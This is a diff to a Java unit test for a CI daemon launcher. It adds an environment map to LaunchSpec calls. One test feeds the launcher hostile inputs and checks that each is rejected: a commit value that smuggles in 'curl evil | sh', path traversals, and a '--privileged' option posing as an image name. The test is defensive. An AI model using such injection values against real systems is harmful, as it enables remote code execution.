@@ -8,6 +8,7 @@ import static org.junit.jupiter.api.Assertions.assertTrue;
 import eu.wohlben.qits.ci.daemonhost.CiDaemonLauncher.LaunchSpec;
 import eu.wohlben.qits.ci.error.BadRequestException;
 import java.util.List;
+import java.util.Map;
 import org.junit.jupiter.api.Test;
 
 /**
@@ -49,7 +50,8 @@ public class CiDaemonLauncherTest {
           "daemon-7",
           "s3cr3t",
           "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:deadbeef",
-          false);
+          false,
+          Map.of());
 
   /** The same step, having declared {@code docker: true} — the only difference anywhere. */
   private LaunchSpec publishing() {
@@ -63,7 +65,8 @@ public class CiDaemonLauncherTest {
         spec.daemonId(),
         spec.secret(),
         spec.daemonBinaryUrl(),
-        true);
+        true,
+        spec.env());
   }
 
   @Test
@@ -246,23 +249,23 @@ public class CiDaemonLauncherTest {
   public void hostileIdentifiersAreRejectedBeforeAnyDockerCall() {
     CiDaemonLauncher launcher = launcher();
     LaunchSpec injectedSha =
-        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", false);
+        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
     LaunchSpec traversal =
-        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", false);
+        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
     LaunchSpec injectedBranch =
-        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", false);
+        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
     // The image is repo-declared rather than intake-supplied, and it is a positional argument to the
     // docker CLI. Nothing is known to get through it — ProcessBuilder does not shell-split and the
     // trailing `-c <BOOTSTRAP>` defeats the obvious re-parses — but an argument that can be read as
     // an option is not a thing to leave to the parser's good manners.
     LaunchSpec optionShapedImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", false);
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
     LaunchSpec blankImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", false);
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", false, Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
   }
 
